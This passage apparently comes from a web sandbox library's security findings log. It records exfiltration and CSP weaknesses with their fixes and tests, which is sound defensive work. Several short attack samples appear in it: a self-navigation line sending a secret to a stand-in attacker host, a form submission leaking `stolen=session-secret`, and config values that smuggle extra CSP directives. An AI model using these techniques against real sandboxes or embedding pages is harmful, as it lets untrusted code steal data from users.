between one and 1.25 budgets after its last answer. Mechanism in `src/lib/watchdog.ts`, decision in
[ADR-003](ADR-003-lifecycle-and-liveness.md). What holds, verified 2026-10-11: case 1 (worker mode)
on every browser, since the port is handed to the worker and a looping worker stops answering; case 2
wherever the browser runs the frame out of process. Which case iframe mode lands in is browser policy
and varies by environment: headless Chromium ran the frame out of process in one environment and on
the host's thread in CI; WebKit ran it on the host's thread. Case 3 stays a platform limit, stated in
the README. Tests: `test/e2e/watchdog.spec.ts` (iframe mode measures the process model at runtime on
every browser, then asserts the endless-loop bound out of process or that host stalls are not charged
to the guest on a shared thread; worker loop, no false positives across a reset, and stop on
removal/termination on every browser) and `src/lib/watchdog.test.ts` (timing).
**Still open**: the memory and inbound-traffic note under *Open* below.

**Guarantee**: untrusted code can never keep the host page busy indefinitely; the host can always
stop the guest within a bounded time.

**Verified**: the only budget is `workerExecutionTimeout`. `execute()` arms it through
`_startTimeout()` (`src/host.ts`), which sets a timer only when `mode === 'worker'`; iframe mode has
none. It is opt-in (default `0`), and nothing reports completion, so it recreates the frame even
after code that finished. Background: [`RESOURCE_QUOTAS.md`](research/RESOURCE_QUOTAS.md).

**What each mode provides**:

1. **Worker mode — holds today, by construction.** Guest logic runs on its own thread and never
   blocks the host's. On expiry the host recreates the frame (`initialize()`), which terminates the
   worker. Shipped; asserted by `test/e2e/worker-timeout.spec.ts`.
2. **Iframe mode, frame in its own process** (browser policy: Chromium often isolates opaque-origin
   sandboxed frames this way, but not in every environment). A guest loop blocks only the guest's process and the host stays responsive, so
   a host-side heartbeat watchdog can remove the frame. Holds once that watchdog exists; it pairs
   with B2's lifecycle owner.
3. **Iframe mode, frame on the host's thread** (platforms without that isolation). A guest loop
   stops all script on that thread, the watchdog included. No in-page mechanism can bound this: it
   is a platform limit, stated as such. Strict mode, below, avoids it.

**Design — separate execution from rendering**, as an opt-in **strict mode**. Guest logic runs in
a worker; the DOM frame carries no guest script (its CSP admits none) and only renders updates the
host applies over the broker (B1). A frame with no guest script cannot loop, and a worker that
loops can always be stopped, so bounded execution no longer depends on the browser's process model.
Keeping guest code out of the frame also strengthens the self-navigation guarantee (S10) and the
guarantees about what guest code can reach from its global scope: `eval` only when explicitly
enabled (S4), and no WebRTC (S13). The cost is a different programming model (no inline guest
`<script>`; UI updates are declarative messages), which is why it is opt-in.

**Default iframe mode** keeps guest script and gets the watchdog: bounded wherever the browser
isolates the frame (case 2), with case 3's limit documented.

**Depends on**: the broker (B1) to carry render updates from worker to frame; B2 for watchdog and lifecycle.

**Open**: this bounds time, not memory; nothing caps allocation in either mode. Sampling
`performance.measureUserAgentSpecificMemory()` where available remains a follow-up. Likewise the
host does not cap inbound traffic: a guest that floods it with calls or log lines costs host time.
That belongs to the same watchdog, not to a per-channel cap, since an RPC limit alone would leave
`console.log` in a loop unbounded. (The `violation` event is capped at 100 per environment (S5), which bounds the embedder
listeners a guest can trigger through it, not the cost of receiving its messages.)

**Acceptance**: in strict mode, an unbounded loop in guest logic is stopped within the configured
budget on Chromium, Firefox and WebKit (CI); in default mode, the watchdog stops it where the frame
runs in its own process, and the README states the same-thread limit plainly.

---

### S7 · Silently ignored CSP directives — ✅ **done**

*From [Research 11.1](research/11_meta_csp_delivery/README.md).*

**Guarantee**: the guest policy contains no directive the browser discards, and a consumer who configures
one is told, once per directive per instance.

**Done**: `dropMetaIgnoredDirectives()` (`src/lib/csp/drop-meta-ignored.ts`) removes `frame-ancestors`,
`report-uri`, `report-to` and `sandbox` (any case, any value) at the start of `_getCSPDirectives`
(`src/host.ts`), the one builder of the guest policy, so worker mode is covered too. Each is left out,
not emitted as `'none'`: the browser would discard `'none'` just the same. Every other directive keeps
S16's rule (empty means `'none'`). The warning names where the concern is handled instead: embedding
by the host page, reporting by the element's `violation` event (S5), flags by `capabilities`.
`CSPDirectives['frame-ancestors']` is marked `@deprecated`; `generateCSP()` itself is unchanged, since
it does not know how its output is delivered. Tests:
- unit: `src/lib/csp/drop-meta-ignored.test.ts` (each directive with a source list, an empty list and a
  single value; case variants; one warning per directive per instance; other directives untouched) and
  `test/unit/host.test.ts` (iframe and worker mode across `reset()`);
- e2e: section S7 of `test/e2e/guard-rails.spec.ts` (absent from the guest's own policy, one warning
  each across reset and a mode switch, and in Chromium no "ignored when delivered via a `<meta>`
  element" message, the channel research 11.1 shows is live).

**Verified**: a `<meta>`-delivered policy discards `frame-ancestors`, `report-uri`/`report-to` and
`sandbox` — Chromium logs *"is ignored when delivered via a `<meta>` element"* for each.
`CSPDirectives` exposes `frame-ancestors` (`src/csp-directives.ts`) and `generateCSP()` emits it
whenever a consumer supplies a non-empty array. Nothing warns them, so a consumer who sets it
believes they restricted embedding and has configured nothing. The shipped default passes `[]`,
which is dropped as empty, so only the public config surface is affected.

**Work**: reject or warn on these four directives in `generateCSP()` under meta delivery; move
embedding control to the host element. Note this also rules out `report-uri`/`report-to`, leaving
the in-sandbox `securitypolicyviolation` event (S5) as the only reporting route.

**Acceptance**: setting `frame-ancestors` raises a warning (or throws) rather than emitting a
directive the browser discards.

*Update (2026-10-13, S16)*: the shipped default no longer lists `frame-ancestors`, and an explicit `[]`
is now emitted as `frame-ancestors 'none'`, which a `<meta>` policy discards like any other value.

### S8 · Pre-policy egress window — **P3 · accepted risk** (cooperative mode; a limit, S44)

*2026-10-15*: a cooperative-mode limit. Strict mode's view document holds only the policy and the library's script
when it is parsed, and guest markup reaches it later, rendered under the policy.


*From [Research 11.4](research/11_meta_csp_delivery/README.md).*

**Verified**: in 1 of 5 runs a request reached the network from the transient `about:blank`
document, before the meta policy took effect. It is racy and **branch-independent** — it appeared
on the well-formed document, which takes the safest injection path. The CSP violation was still
logged, so the resource was blocked from *use*; the request itself still left, which is sufficient
for exfiltration where the URL is the payload.

**No mitigation exists under `<meta>` delivery** — the window is inherent to the mechanism. It
closes only under header delivery, where the policy arrives with the response carrying the content.
Tracked as a known limitation; see [ADR-001](ADR-001-continue-or-adopt.md).

### S9 · `base-uri` and `form-action` are silently unrestricted — ✅ **done**

**Done**: `generateCSP()` emits `'none'` for an empty directive listed in `NON_FALLBACK_DIRECTIVES`
(`base-uri`, `form-action`). `frame-ancestors` is left out on purpose: browsers ignore it under
`<meta>` delivery (S7). Research 12 passes.
**Tightened** (2026-10-13, [ADR-004](ADR-004-files-as-blob-urls.md)): `base-uri` no longer gains a
virtual-files base, so with the default config it is always `'none'`; the guest document has no `<base>`.
**Generalised** (2026-10-13, S16): every empty directive is emitted as `'none'`, so the
`NON_FALLBACK_DIRECTIVES` special case is gone.

*From [Research 12](research/12_non_fallback_directives/README.md).*

**Verified**: `generateCSP()` omits empty-array directives, documented as *"Empty arrays are
omitted to allow `default-src` fallback"* (`src/lib/csp/csp-generator.ts:3-5`). That reasoning
holds for fetch directives but **not** for `base-uri` or `form-action`, which have no fallback.
The shipped default sets both to `[]`, so the emitted policy is:

```
default-src 'none'; upgrade-insecure-requests; script-src 'self' 'unsafe-inline';
style-src 'unsafe-inline'; worker-src blob: data:;
```

— with no `base-uri` and no `form-action`, i.e. **both unrestricted**.

**Exploited**: with `capabilities: ['allow-scripts', 'allow-forms']` (both sanctioned values in
`ALLOWED_CAPABILITIES`) and the default `connectionsAllowed`, a `GET` form submitted to a
non-allowlisted target reached the network as `…?stolen=session-secret`, **with no CSP violation
logged**. A form is a complete exfiltration primitive: no `fetch`, no `connect-src`, no bridge.

`base-uri` is the mitigation [finding 10](research/10_base_tag_hijacking/README.md) recommended
for itself and never got — and it matters more than that finding knew, since the VFS routes assets
through an injected `<base href>` (`src/host.ts:257`).

**Work**: teach `generateCSP()` which directives fall back and which do not; emit `'none'` for an
empty non-fallback directive instead of omitting it. Default `base-uri` to `'self'` and
`form-action` to `'none'`. Document that `[]` means *deny* in this config surface.

**Acceptance**: `docs/research/12_non_fallback_directives/reproduce.spec.ts` passes (both cases are
written to fail against today's code).

### S10 · The guest frame can navigate itself to carry data out — ✅ **done**

*From [issue #6](https://github.com/MentalGear/web-sandbox/issues/6) (N1) and
[Research 14](research/14_self_navigation/README.md).*

**Verified**: with only `allow-scripts`, `location.href = attacker + secret` sent the secret in the
request URL. Sandbox flags stop top-level navigation, not self-navigation, and no CSP directive
governs it.

**Done**: the guest frame sits inside a library-owned wrapper frame whose policy is
`frame-src 'none'`. The embedder's `frame-src` is checked on every navigation of a child frame,
including ones the child starts, before the request is sent. Research 14.1 covers script, link,
`window.open(…, '_self')` and meta refresh.

Confirmed in Chromium, Firefox and WebKit (CI).

### S11 · A fresh port is handed to whatever document loads next — ✅ **done**

*From issue #6 (N2).*

**Verified**: `onload` called `setupChannel()` on every load, posting a new `MessagePort` (and queued
`execute()` code) to `'*'`. After S10 the attacker's page received a live channel.

**Done**: the channel is set up exactly once per frame. A second load closes the port, drops the
queue, removes the frame and fires `terminated`; `execute()` is refused until the next
`setConfig()` / `load()`. Research 14.2.

### S12 · Risky capabilities are on the allow-list — ✅ **done**

*From issue #6 (N3) and [Research 13](research/13_popup_exfiltration/README.md).*

**Verified**: `ALLOWED_CAPABILITIES` included `allow-popups` (URL exfiltration through a new
top-level window, which neither CSP nor the wrapper's `frame-src` covers), `allow-modals`,
`allow-downloads` and `allow-presentation`.

**Done**: split into `SAFE_CAPABILITIES` (`allow-scripts`, `allow-forms`, `allow-pointer-lock`,
`allow-orientation-lock`) and `UNSAFE_CAPABILITIES` (popups, modals, downloads, presentation). Unsafe
ones are dropped from `capabilities` with a warning and accepted only through `unsafeCapabilities`,
which warns once per capability per instance. `allow-forms` stays safe: `form-action` defaults to
`'none'` (S9) and a form submission is a navigation the wrapper blocks (S10).

### S13 · No WebRTC egress guarantee — ✅ **done in strict mode** (the default); cooperative mode: a limit (frames the guest creates, S44)

**Done (strict mode, 2026-10-13, [ADR-005](ADR-005-strict-mode.md))**: guest code runs only in a worker, which
has no peer-connection constructor, and the view runs no guest script; a frame in rendered markup is removed
before it is inserted, so no realm with `RTCPeerConnection` is reachable at all. `test/e2e/webrtc.spec.ts`
(strict case, all three engines): the worker has none; markup carrying the ICE probe inline and inside two
frames renders no frame, runs nothing and sends 0 UDP packets, while the same probe on the host page reaches
the loopback listener (Chromium, WebKit; Firefox sends no loopback STUN even from the host). **Default-mode
residual, unchanged**: a frame the guest creates in iframe mode keeps `RTCPeerConnection` and its ICE traffic
leaves in Chromium and WebKit (below); use strict mode where that matters.

**Guarantee**: guest code cannot reach the network through WebRTC.

**What holds now**: the guest's own realm has no peer-connection constructor from its first script on, in
iframe mode, and a worker never has one, on Chromium, Firefox and WebKit. **What does not**: a frame the
guest creates is a realm of its own and keeps `RTCPeerConnection`; in Chromium and WebKit its ICE
traffic leaves. So the guarantee does not hold in default iframe mode until guest script is kept out of
the DOM frame (strict mode, S6).

**Measured** (2026-10-13, Playwright 1.58.1 builds: Chromium 141, Firefox 146, WebKit 26.0 on Linux;
default config plus `scriptUnsafe` to run the probe; a peer connection with a data channel, an offer, and
STUN and TURN servers on a loopback UDP listener; a throwaway probe, whose findings
`test/e2e/webrtc.spec.ts` now asserts):

| | Chromium | Firefox | WebKit |
| :--- | :--- | :--- | :--- |
| guest realm, before | `RTCPeerConnection`, `webkitRTCPeerConnection`; constructs, host candidates, UDP leaves | `RTCPeerConnection`; constructs, gathering completes | `RTCPeerConnection`; constructs, UDP leaves |
| srcdoc frame the guest creates | same | same | same |
| about:blank frame the guest creates | cross-origin to the guest (`SecurityError`) | same | same |
| worker | no `RTCPeerConnection` (only `RTCDataChannel`, encoded frames) | same | same (`RTCDataChannel` only) |
| UDP to loopback STUN/TURN, host page (control) | yes | none (Firefox sends nothing to a loopback ICE server) | yes |
| `webrtc 'block'` in the guest policy | no effect | no effect | no effect |
| `allow="local-network-access 'none'"` | no effect | n/a | n/a |
| constructible network-capable RTC interfaces | `RTCPeerConnection`, `webkitRTCPeerConnection` | `RTCPeerConnection` | `RTCPeerConnection` |

So no policy or sandbox flag makes any engine refuse peer connections, and the frame-src `'none'` the
guest inherits from the wrapper does not cover `srcdoc` frames. The constructor is the only lever.
The TURN username never left (the listener did not answer the binding), but the destination of a STUN
request, or a DNS lookup of a `stun:` host name, is enough to carry data out.

**Done**: the guest bootstrap (`src/lib/in-sandbox-script.ts`) deletes `RTCPeerConnection`,
`webkitRTCPeerConnection` and `mozRTCPeerConnection` from the global object before any guest code runs,
in both modes. It cannot be undone from the guest realm: those are the only constructible network-capable
WebRTC interfaces in each engine, and the guest has no same-origin realm to take one from, because every
frame it creates gets a fresh opaque origin (no `allow-same-origin`) and workers have none. The host warns
once per instance when the policy refuses the inline bootstrap while scripts are allowed, since then
guest scripts from allowlisted origins would run without it. No unsafe capability is offered for WebRTC:
nothing needs it yet, and with any reachable TURN server it is an egress route. Tests:
- unit: `src/lib/in-sandbox-script.test.ts` (the constructors are removed, nothing else), `test/unit/host.test.ts`
  (the bootstrap-refused warning);
- e2e: `test/e2e/webrtc.spec.ts`, all three engines: the shipping config's first guest script sees none;
  an about:blank or srcdoc frame the guest creates, and `window[n]`, are cross-origin to it; the worker has
  none; and the residual, asserted as measured: the created frame has `RTCPeerConnection`, gathers host
  candidates, and in Chromium and WebKit reaches the loopback listener (Firefox: no traffic, as for its
  control).

**Residual, and why no by-construction fix exists in default mode**: a created frame runs its own script
under the guest's inherited policy (`script-src 'unsafe-inline'` is what the guest itself needs), so the
bootstrap never runs there. Measured alternatives: overriding `HTMLIFrameElement.prototype` access is
moot (created frames are already cross-origin; what matters is their own script), and refusing frame
creation would need every insertion path (`innerHTML`, `insertAdjacentHTML`, `document.write`,
`setHTMLUnsafe`, the parser on the guest's own markup, closed declarative shadow roots that no observer
sees) and `javascript:` URLs: no single chokepoint. Strict mode (S6) is the structural answer: with no
guest script in the DOM frame, no frame can be created that runs one.

**Acceptance (original)**: by default, in iframe mode, `typeof RTCPeerConnection === 'undefined'` in the guest
and in any frame it creates, on Chromium, Firefox and WebKit (CI). Met for the guest; not for frames it
creates.

### S14 · **script-src 'self'** admits other origins in the guest — ✅ **done**

*From the [blob-delivery probe](research/blob-delivery-probe.md).*

**Verified** (2026-10-13, Playwright 1.58.1 builds: Chromium 141, Firefox 146, WebKit 26.0 on Linux):
the default guest policy was `script-src 'self' 'unsafe-inline'`. The guest's origin is opaque, and
the engines disagreed on what `'self'` matched there:
- **WebKit** admitted any https origin. With the shipping config (`scriptUnsafe: false`), a classic
  script, a module script and `import()` from a non-allowlisted origin loaded and ran, with no
  violation. A raw TCP listener received the connection. This was an egress route in the default
  config.
- **Chromium** resolved `'self'` to the host page's origin, so the guest could load scripts from the
  host's server.
- **Firefox** matched nothing.

To re-measure in Safari proper: Playwright's WebKit on Linux is not Safari.

**Work**: remove `'self'` from the default `script-src` and the playground presets. Drop it from every
directive a config supplies, at the one place each guest policy is built. Warn once per directive per
instance. A directive emptied by the drop becomes `'none'` rather than falling back to `default-src`.

**Acceptance**: no guest policy contains `'self'`, in either mode. With the shipping default, no engine
loads a script from another origin or from the host origin. A configured `'self'` is dropped with a
warning and changes nothing, identically on Chromium, Firefox and WebKit.

**Done**: `dropSelfSources()` (`src/lib/csp/drop-self.ts`) is applied last in `_getCSP`
(`src/host.ts`), the one builder of the guest policy (worker mode inherits it). The default
`script-src` is `'unsafe-inline'`. Tests:
- unit: `src/lib/csp/drop-self.test.ts` and `test/unit/host.test.ts` (iframe and worker mode, across
  `reset()`);
- e2e: section 5a of `test/e2e/blob-delivery.spec.ts` (iframe, plus worker-mode `importScripts` and
  `import()`).

**Upstream** (2026-10-14): WebKit main matches nothing for `'self'` in an opaque origin since `314912@main`
(the `!scheme.isEmpty()` guard in `ContentSecurityPolicySource::schemeMatches`). Minimal conditions measured:
any opaque-origin document (`sandbox` without `allow-same-origin`, or a `data:` frame) with `'self'` in its
policy; every fetch directive; with `upgrade-insecure-requests`, http origins too. The drop stays: it does not
depend on the engine.

### S15 · The guest can read the host page's URL — ✅ **done** (platform limits below; WebKit residual in S17)

**Guarantee**: nothing in the guest's own document or location reveals the host page's URL or origin.

**Verified** (2026-10-13, Playwright 1.58.1 builds: Chromium 141, Firefox 146, WebKit 26.0 on Linux;
iframe mode, default config, guest code run through `execute()`; throwaway probe, not kept):

| Exposed in the guest | Chromium | Firefox | WebKit |
| :--- | :--- | :--- | :--- |
| `document.baseURI` | **full host page URL** | **full host page URL** | **full host page URL** |
| `document.referrer` | empty | empty | **host origin** (`http://localhost:4444/`) |
| `location.ancestorOrigins` | **`["null", host origin]`** | not implemented | **`["null", host origin]`** |
| `location.href` | `about:srcdoc` | `about:srcdoc` | `about:srcdoc` |

A `srcdoc` document takes its base URL from the document that embeds it, so the guest inherits the
wrapper's, which inherits the host page's: path, query and fragment included, so a token in the host
URL is readable by guest code. `ancestorOrigins` lists the wrapper (`null`) and the host's origin.
In worker mode the worker's own `location` is its `blob:null/…` URL and none of the three exists, so
the exposure is iframe mode only.

**Work** (proposal, not built): give the wrapper document a fixed, inert base URL — a `<base href>` in
the wrapper, which its own policy must allow, since the wrapper's CSP is `frame-src 'none'` only — so
the guest inherits that instead of the host's. Set a no-referrer policy on both frames
(`referrerpolicy="no-referrer"` and a `<meta name="referrer">`). `ancestorOrigins` cannot be set by
the page; check whether the referrer policy changes it in Chromium and WebKit, and document what
remains if it does not.

**Acceptance**: in all three engines, the guest's `document.baseURI`, `document.referrer` and
`location.ancestorOrigins` reveal nothing of the host page URL; `base-uri` stays `'none'` in the guest
policy.

**Done**: the wrapper document (`buildWrapperDocument`, `src/lib/frame-documents.ts`) carries
`<base href="about:blank">` and `<meta name="referrer" content="no-referrer">` in its `<head>`, and both
iframes carry `referrerpolicy="no-referrer"`. The guest inherits the base and the referrer policy; its
own `<base>` is still refused by `base-uri 'none'`. `about:blank` was chosen over an
`https://….invalid` base because nothing resolves against it: a relative URL in guest markup sends no
request at all, where an `.invalid` base turned it into a request that only the policy stopped.
Absolute URLs (files, workers, allowlisted origins) are unaffected, and the S10/S11 frame checks and
the file tests pass unchanged. Tests:
- e2e: `test/e2e/host-url.spec.ts`, on a host page URL with a distinctive query and fragment; Referer
  is recorded by a local HTTPS server that every expected request must reach;
- unit: `src/lib/frame-documents.test.ts` and `test/unit/host.test.ts` (iframe and worker mode).

Measured 2026-10-13 (same builds as above), before → after; "host URL" includes path and query:

| Exposed to the guest | Chromium | Firefox | WebKit |
| :--- | :--- | :--- | :--- |
| `document.baseURI`, `import.meta.url`, relative `href`s | full host URL → `about:blank` | full host URL → `about:blank` | full host URL → `about:blank` |
| relative URL in markup (`<img src="x.png">`) | resolved against the host URL, refused by CSP → never resolved, no request | same | same |
| `document.referrer`, violation event `referrer` | empty | empty | host origin, or host URL if the host page's policy is `unsafe-url` → empty |
| `Referer` on guest image requests, by default | none | host origin → none | host origin → none |
| `Referer` when the guest asks for `unsafe-url` | none | host origin (limit) | host origin (limit) |
| `Referer` on `fetch()`, any policy | none | none | none |
| `location.ancestorOrigins` | `["null", host origin]` (limit) | not implemented | `["null", host origin]` (limit) |
| a frame the guest creates: `document.referrer` | empty | empty | host URL without fragment (S17) |
| worker: `location`, `Referer` | own `blob:null/…`, none | same | same |

**Platform limits**, asserted per engine by the tests:
- `location.ancestorOrigins` lists the host origin in Chromium and WebKit. A page cannot change it, and
  `referrerpolicy="no-referrer"` does not mask it in either engine.
- Firefox and WebKit send the host origin as `Referer` on image requests whenever the policy in force
  allows one. By default it does not; the guest can ask for one per request or with its own
  `<meta name="referrer">`, and no document can prevent that. Path and query never appear **to a cross-site
  target** (what was measured here); to a target that is same-site with the host page, WebKit sends the full
  host URL (S18, research 15 P8).
- WebKit gives a frame the guest creates the host page URL, minus fragment, as `document.referrer`
  (S17). That is the full path and query, so the guarantee does not hold in WebKit until S17 is done.

### S16 · An empty directive array can widen the policy — ✅ **done**

**Guarantee**: no configuration can make the emitted policy broader than the same configuration with
that directive left out.

**Verified** (2026-10-13): `generateCSP({ 'default-src': [], 'script-src': ["'unsafe-inline'"] })`
returns `script-src 'unsafe-inline';` — no `default-src` at all. `generateCSP()` puts its
`default-src 'none'` first and spreads the config over it, so an empty array replaces it, and an empty
fetch directive is omitted. `connectionsAllowed: { 'default-src': [] }` therefore leaves every fetch
directive that is not set explicitly unrestricted. Omitting `default-src` from the config keeps the
default `'none'`, so `[]` — which the config surface documents as "deny" — is broader than leaving it
out.

**Work**: by construction, an empty array for any directive emits `'none'`, never an omission, so
"empty" can only ever mean deny. Unit tests over every directive in `CSPDirectives`.

**Acceptance**: for every directive, the policy from a config with that directive set to `[]` is no
broader than from the same config without it; `default-src: []` emits `default-src 'none'`.

**Done**: `generateCSP()` (`src/lib/csp/csp-generator.ts`) emits `'none'` for any directive whose
array is empty after blank strings are dropped; nothing is omitted any more. `upgrade-insecure-requests`
is emitted whenever its key is present, and a non-array value still throws. Interactions:
- the shipping default no longer lists empty fetch directives (`connect-src: []` …), which would now pin
  each to `'none'` and cut it off from an embedder's `default-src`; its emitted policy is unchanged;
- `dropSelfSources()` leaves a directive it emptied as `[]` and the generator makes it `'none'`;
- `addFileSources()` treats `[]` like `'none'` (kept, with a warning), so registering a file never
  widens a denied directive to `default-src`'s sources; an empty `default-src` gives files `blob:` only.

Tests:
- unit: `src/lib/csp/csp-generator.test.ts` — every directive of `CSPDirectives` (a type check fails if
  one is missing), `{ 'default-src': [] }` with a `script-src`, and a property check over every
  directive and eight sample configs: the policy with the directive set to `[]` is never broader than
  with it left out. "Broader" means some directive's enforced sources, after the CSP Level 3 fallback
  chain (an absent `base-uri`, `form-action` or `frame-ancestors` being unrestricted), are not a subset;
  also `file-sources.test.ts`, `drop-self.test.ts`, `test/unit/host.test.ts`, `test/unit/files.test.ts`;
- e2e: `test/e2e/empty-directive.spec.ts` — with `connectionsAllowed: { 'default-src': [] }` an image
  and a fetch to a non-allowlisted origin are refused, each with its violation, in all three engines.

### S17 · WebKit shows a frame the guest creates the host page URL — ✅ **done in strict mode** (the default); cooperative mode: a limit (S44)

**Done (strict mode, 2026-10-13, [ADR-005](ADR-005-strict-mode.md))**: guest code runs only in the worker, which
has no document and whose location is its own `blob:` URL, and the renderer removes every frame from rendered
markup before insertion, so no frame the guest could read a referrer from exists. `test/e2e/host-url.spec.ts`
(strict case, all three engines). **Default-mode residual, unchanged**: in iframe mode a frame the guest
creates still reads the host page URL in WebKit, asserted as measured; the work below stands for that mode.

*Found while doing S15.*

**Verified** (2026-10-13, WebKit 26.0 on Linux): guest code that creates
`<iframe referrerpolicy="unsafe-url" srcdoc="…">` reads, in that frame, `document.referrer` = the host
page URL without its fragment: path and query included. This holds with S15's base and no-referrer
measures in place, and whatever the host page's own referrer policy. WebKit takes the referrer of a
frame navigation from the first non-`srcdoc` document up the frame tree (`FrameLoader::outgoingReferrer`),
which is the host page, with no check for the opaque origins in between. Chromium and Firefox report
an empty referrer. `test/e2e/host-url.spec.ts` asserts the measured value, so a change shows up.

**Work**: make the walk stop before the host page, which means a wrapper that is not a `srcdoc`
document. A `data:` URL wrapper has an opaque origin and a URL that strips to no referrer, but it needs
`data:` in an embedder's `frame-src` and hits URL length limits (the bootstrap carries up to 8 MiB of
files); a host-made `blob:` URL inherits the host page's policy container. Measure both against S10,
S11 and the file tests before choosing; report upstream to WebKit in any case.

**Acceptance**: in WebKit, no frame the guest can create reads the host page's path or query.

### S18 · WebKit sends the host page URL to same-site origins when the guest asks — ✅ **closed in strict mode** (the default); cooperative mode: a limit (S44)

*Found by [research 15](research/15_strict_mode/README.md), P8 (amendment A9).*

**Verified** (2026-10-13, WebKit 26.0 on Linux, library code): in default iframe mode a guest that asks for
`unsafe-url` — `referrerPolicy` on a request, `referrerpolicy` on an element, or its own
`<meta name="referrer">` — sends the host page's **full URL, path and query**, as `Referer` to any allowed
origin that is same-site with the host page (`https://localhost:<port>` from a host page on
`http://localhost:4444`). S15 measured cross-site targets only, where WebKit trims to the origin. Chromium
sends nothing; Firefox sends the host origin. The inherited `no-referrer` holds when the guest asks for
nothing. `test/e2e/host-url.spec.ts` asserts the measured value per engine ("residual S18"), so a change shows up.

**Why no default-mode fix**: the guest's own script chooses its referrer policy per request; no document,
attribute or policy the library controls can stop that (S15). The host page can narrow it from outside only by
not allowing same-site origins in the guest policy.

**Closed in strict mode** ([ADR-005](ADR-005-strict-mode.md)): guest code runs in the worker, whose requests
carry no `Referer`, and the renderer removes `<meta>` and forces `referrerpolicy="no-referrer"` on every
element of rendered markup. `test/e2e/host-url.spec.ts` (strict case): requests from the worker and from
rendered markup asking for `unsafe-url` every way it can (attribute, `<meta>`, CSS, a nested frame, `ping`),
cross-site and same-site, carry no `Referer` and no host `Origin` in all three engines, while the host page's
own control shows what each engine would send (WebKit: the full URL same-site).

### S19 · A configured value or key could add CSP directives — ✅ **done**

*From the [adversarial review 2026-10](security/ADVERSARIAL-REVIEW-2026-10.md), A1 and A2.*

**Verified** (2026-10-14): `generateCSP()` only trimmed and joined values, and a browser keeps the first
occurrence of a directive. A `;` inside a value (`default-src: ["'none'; script-src-attr 'unsafe-inline'"]`), or
a space or `;` inside a key (`"img-src https://a; script-src-elem"`), emitted directives ahead of the fixed ones.
In strict mode that gave the view handler attributes: a rendered `onerror` ran and reached a listener in
Chromium, Firefox and WebKit. In iframe mode an injected key bypassed the S7, S14 and bootstrap checks, and
`"'self';"` bypassed the S14 drop.

**Done**: a policy grammar (`src/lib/csp/policy-grammar.ts`), applied at the start of the host's pipeline and
again inside `generateCSP()`: a directive name is kept only if it is one of the known names (the keys of
`CSPDirectives`, which gains `script-src-elem`, `script-src-attr`, `style-src-elem`, `style-src-attr` and
`child-src`); each value is split on whitespace and a token is kept only if it is one CSP source expression.
Everything dropped is warned about once. Tests: `src/lib/csp/policy-grammar.test.ts` (grammar tables, a
500-config property over the generator), `test/unit/policy-guarantees.test.ts` (a 200-config property over the
element in strict and iframe mode: fixed directives keep their values, the directive set is what the config may
name, each once), `test/e2e/review-policy.spec.ts` (the strict view, all engines).

### S20 · Bootstrap check and config hygiene — ✅ **done**

*From the review, A3–A8.*

**Done**: `inlineScriptsAllowed()` follows CSP3's `script-src-elem` → `script-src` → `default-src` order (A3; a
policy refusing the bootstrap through `script-src-elem` went unwarned). An unknown `mode` (`'Strict'`, `' strict'`)
no longer means iframe mode: every build terminates with `unknown mode …` until a config names a valid one (A4).
`'unsafe-eval'` and `'wasm-unsafe-eval'` are dropped from configured directives, with a warning while
`scriptUnsafe` is off: `scriptUnsafe` is the one switch (A5, `src/lib/csp/drop-eval.ts`). `scriptUnsafe`,
`autoResize` and `entry` are normalised on the merged config, which `deepMerge` reads from the input exactly once
(A6), and `deepMerge` skips `__proto__`, `constructor` and `prototype` and reads own keys only (A7). The default
bootstrap is asserted parser-safe when the guest document is built (A8). Tests: `test/unit/policy-guarantees.test.ts`,
`src/lib/markup-references.test.ts`, `test/e2e/package.spec.ts` (A8 on the bundle).

**Follow-up (2026-10-14, by-construction audit)**: A3's order now lives in one CSP3 fallback table
(`src/lib/csp/effective-directive.ts`) that every consumer reads: the bootstrap check, file sources (`blob:` goes
to the directive that governs each load, so `script-src-elem` / `style-src-elem` when configured; before, those
policies refused every registered script or stylesheet) and strict mode (only the view's own directives are
asked). Byte-identical for policies without `-elem` directives (property test). A6: `setConfig()` reads one
`structuredClone` of its argument, and every boolean interpolated into a bootstrap is `=== true` at the
interpolation. A7: `deepMerge` defines every key as an own data property, so no key list is needed (property test
with `__proto__`, `constructor`, `prototype` at any depth). Tests: `src/lib/csp/file-sources.test.ts`,
`test/unit/policy-guarantees.test.ts`, `test/e2e/review-policy.spec.ts` ("A3 class").

### S21 · The channel: one trusted INIT_PORT, a port guest code cannot reach — ✅ **done**

*From the review, B1, B2 and B4; [ADR-002 amendment](ADR-002-host-guest-broker.md#amendment-2026-10-14-adversarial-review-the-channel).*

**Verified** (2026-10-14, all three engines): another frame on the host page that posted INIT_PORT before the
host captured the guest's bridge or, without a port, left it dead (B1). Guest code that patched
`MessagePort.prototype.postMessage` received the port from the bootstrap's next post and handed it to a nested
worker that answered the watchdog's pings while the guest looped: never terminated (B2). In Firefox, frames
already queued on a port the host had closed were still dispatched: 574 stale log lines after a `reset()` from a
listener (B4).

**Done**: the bootstrap and the worker-mode frame accept exactly one INIT_PORT (trusted, one port, from
`parent.parent` in iframe mode) in a capture listener, ignoring anything else without throwing. Every operation
on the port goes through primitives captured before guest code runs, called through a captured `Reflect.apply`;
guest code can no longer post frames of its own. The host handles frames only from the current environment's
ports. Worker mode keeps `Worker`/`SharedWorker`: the watchdog no longer depends on their absence. Tests:
`test/e2e/review-channels.spec.ts`, `src/lib/in-sandbox-script.test.ts`, `test/unit/channel-guarantees.test.ts`.
The specs that used to forge frames on the port now forge through what the bootstrap reads.

### S22 · Logs, re-entrancy, fetch headers, calls in flight — ✅ **done**

*From the review, B3, B5, B6 and B7.*

**Done**: `sandbox-log` details are normalised (`level` from a closed set, `args` at most 64 with strings cut at
64 Ki), labelled `source: 'guest' | 'host'` by the host, and guest lines are limited to 1000 per second per
environment with one warning; `SandboxDevTools` never throws and never lets a guest string be a console format
string (B3). The execution timeout and the entry-failure path re-check the environment after dispatching their
log line, so a listener's `reset()`/`terminate()` is not undone ([ADR-003 amendment](ADR-003-lifecycle-and-liveness.md#amendment-2026-10-14-a-listeners-reset-or-terminate-is-never-undone), B5).
A fetch header value must be a ByteString without CR, LF or NUL, so a refused request is recorded as `refused`,
not `failed` (B6). At most 256 inbound calls run at once per channel; beyond that a call is refused at once with
the new reported code `BUSY` (B7). Tests: `test/unit/channel-guarantees.test.ts`, `src/lib/rpc.test.ts`,
`test/e2e/review-channels.spec.ts` (B7).

**Follow-up (2026-10-14, by-construction audit)**: B5's re-checks are one helper, `_notifyThenAct`, the only
